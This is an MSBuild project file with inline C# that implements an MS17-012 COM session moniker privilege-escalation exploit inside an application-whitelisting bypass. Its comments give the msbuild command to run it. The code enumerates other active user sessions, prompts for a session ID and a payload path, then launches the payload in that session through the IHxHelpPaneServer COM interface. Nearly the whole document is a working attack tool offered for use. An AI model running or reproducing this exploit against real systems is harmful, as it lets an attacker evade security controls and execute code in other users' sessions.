<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- COM Session Moniker EoP Exploit running within MSBuild.exe -->
  <!-- This code lets you execute the COM Session Moniker Exploit and Bypass Application Whitelisting. -->
  <!-- Save This File And Execute The Following Command: -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MS17-012.csproj -->
  <!-- Author and founder of the MSBuild Application Whitelisting Bypass code: Casey Smith, Twitter: @subTee -->
  <!-- Author and founder of the COM Session Moniker EoP Exploit: James Forshaw, Twitter: @tiraniddo -->
  <!-- License: BSD 3-Clause -->
  <Target Name="PoC_SessionMoniker_EoP">
    <MS17_012>
    </MS17_012>
  </Target>
  <UsingTask
    TaskName="MS17_012"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using System.Collections.Generic;
			using System.Diagnostics;
			using System.IO;
			using System.Linq;
			using System.Runtime.InteropServices;
			using System.Threading;
			using System.Reflection;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;


			public class MS17_012 :  Task, ITask
			{
				public override bool Execute()
				{
					Program.Main();
					return true;
				}
			}
			
			class Program
			{
				[ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
				interface IHxHelpPaneServer
				{
					void DisplayTask(string task);
					void DisplayContents(string contents);
					void DisplaySearchResults(string search);
					void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
				}

				enum WTS_CONNECTSTATE_CLASS
				{
					WTSActive,              // User logged on to WinStation
					WTSConnected,           // WinStation connected to client
					WTSConnectQuery,        // In the process of connecting to client
					WTSShadow,              // Shadowing another WinStation
					WTSDisconnected,        // WinStation logged on without client
					WTSIdle,                // Waiting for client to connect
					WTSListen,              // WinStation is listening for connection
					WTSReset,               // WinStation is being reset
					WTSDown,                // WinStation is down due to error
					WTSInit,                // WinStation in initialization
				}

				public enum WTS_INFO_CLASS
				{
					WTSInitialProgram,
					WTSApplicationName,
					WTSWorkingDirectory,
					WTSOEMId,
					WTSSessionId,
					WTSUserName,
					WTSWinStationName,
					WTSDomainName,
					WTSConnectState,
					WTSClientBuildNumber,
					WTSClientName,
					WTSClientDirectory,
					WTSClientProductId,
					WTSClientHardwareId,
					WTSClientAddress,
					WTSClientDisplay,
					WTSClientProtocolType,
					WTSIdleTime,
					WTSLogonTime,
					WTSIncomingBytes,
					WTSOutgoingBytes,
					WTSIncomingFrames,
					WTSOutgoingFrames,
					WTSClientInfo,
					WTSSessionInfo,
					WTSConfigInfo,
					WTSValidationInfo,
					WTSSessionAddressV4,
					WTSIsRemoteSession
				}

				[StructLayout(LayoutKind.Sequential)]
				struct WTS_SESSION_INFO
				{
					public int SessionId;
					public IntPtr pWinStationName;
					public WTS_CONNECTSTATE_CLASS State;
				}

				[DllImport("wtsapi32.dll", SetLastError = true)]
				static extern bool WTSEnumerateSessions(
						IntPtr hServer,
						int Reserved,
						int Version,
						out IntPtr ppSessionInfo,
						out int pCount);

				[DllImport("Wtsapi32.dll")]
				public static extern bool WTSQuerySessionInformation(
						IntPtr hServer,
						int iSessionID,
						WTS_INFO_CLASS WtsInfoClass,
						out IntPtr pBuffer,
						out uint iBytesReturned);

				[DllImport("wtsapi32.dll", SetLastError = true)]
				static extern void WTSFreeMemory(IntPtr memory);

				public static IEnumerable<int> GetSessionIds()
				{
					List<int> sids = new List<int>();
					IntPtr hServer = IntPtr.Zero;
					IntPtr pSessions = IntPtr.Zero;
					int dwSessionCount = 0;
					try
					{
						if (WTSEnumerateSessions(hServer, 0, 1, out pSessions, out dwSessionCount))
						{
							IntPtr current = pSessions;
							for (int i = 0; i < dwSessionCount; ++i)
							{
								IntPtr pAddress = IntPtr.Zero;
								string sUserName = string.Empty;
								string sDomain = string.Empty;
								uint iReturned = 0;

								WTS_SESSION_INFO session_info = (WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(WTS_SESSION_INFO));
								int current_session_id = Process.GetCurrentProcess().SessionId;

								if (session_info.State == WTS_CONNECTSTATE_CLASS.WTSActive)
								{
									if (session_info.SessionId != 0 && session_info.SessionId != current_session_id)
									//if (session_info.SessionId != 0)
									{
										//Get the Domain Name of the Terminal Services User
										if (WTSQuerySessionInformation(hServer, session_info.SessionId, WTS_INFO_CLASS.WTSDomainName, out pAddress, out iReturned) == true)
										{
											sDomain = Marshal.PtrToStringAnsi(pAddress);
										}

										//Get the User Name of the Terminal Services User
										if (WTSQuerySessionInformation(hServer, session_info.SessionId, WTS_INFO_CLASS.WTSUserName, out pAddress, out iReturned) == true)
										{
											sUserName = Marshal.PtrToStringAnsi(pAddress);
										}

										Console.ForegroundColor = ConsoleColor.Yellow;
										Console.WriteLine(" [*] Session ID : " + session_info.SessionId);
										Console.WriteLine(" [*] User Name  : " + sDomain + @"\" + sUserName);
										Console.ResetColor();
										Console.WriteLine();

										sids.Add(session_info.SessionId);
									}
								}
								current += Marshal.SizeOf(typeof(WTS_SESSION_INFO));
							}
						}
					}
					finally
					{
						if (pSessions != IntPtr.Zero)
						{
							WTSFreeMemory(pSessions);
						}
					}

					return sids;
				}

				public static void Main()
				{
					try
					{
						int current_session_id = Process.GetCurrentProcess().SessionId;
						int new_session_id = 0;
						string URI = string.Empty;
						Console.Clear();
						Console.WriteLine(" [+] Enumerating Active User Sessions...");
						Console.WriteLine();

						IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
						//IEnumerable<int> sessions = GetSessionIds();

						if (sessions.Count() == 0)
						{
							Console.ForegroundColor = ConsoleColor.Red;
							Console.WriteLine(" [!] No Active User Sessions Found");
							Console.ResetColor();
							return;
						}

						Console.WriteLine(" [+] Enter a SessionID in which you want to execute your Payload:");
						Console.Write(" [>] ");
						Console.ForegroundColor = ConsoleColor.Green;
						new_session_id = int.Parse(Console.ReadLine());
						Console.ResetColor();

						Console.WriteLine(" [+] Now enter the Payload you want to execute in this Session (e.g. C:\\Temp\\Payload.bat):");
						Console.Write(" [>] ");

						while (true)
						{
							try
							{
								Console.ForegroundColor = ConsoleColor.Green;
								URI = Console.ReadLine();
								Console.ResetColor();
								if (!File.Exists(URI))
								{
									Console.WriteLine(" [!] That Payload does not exist, Please Try Again:");
									Console.Write(" [>] ");
									Console.ForegroundColor = ConsoleColor.Green;
									Console.ResetColor();
								}
								else
								{
									break;
								}
							}
							catch
							{
								Console.WriteLine(" [!] That Payload does not exist, Please Try Again:");
								Console.Write(" [>] ");
								Console.ForegroundColor = ConsoleColor.Green;
								Console.ResetColor();
							}
						}

						Console.WriteLine();
						Console.WriteLine(" [+] Creating Process in Session {0} after 20 Seconds...", new_session_id);
						Thread.Sleep(20000);
						IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));

						Uri target = new Uri(URI);
						server.Execute(target.AbsoluteUri);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex);
					}
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>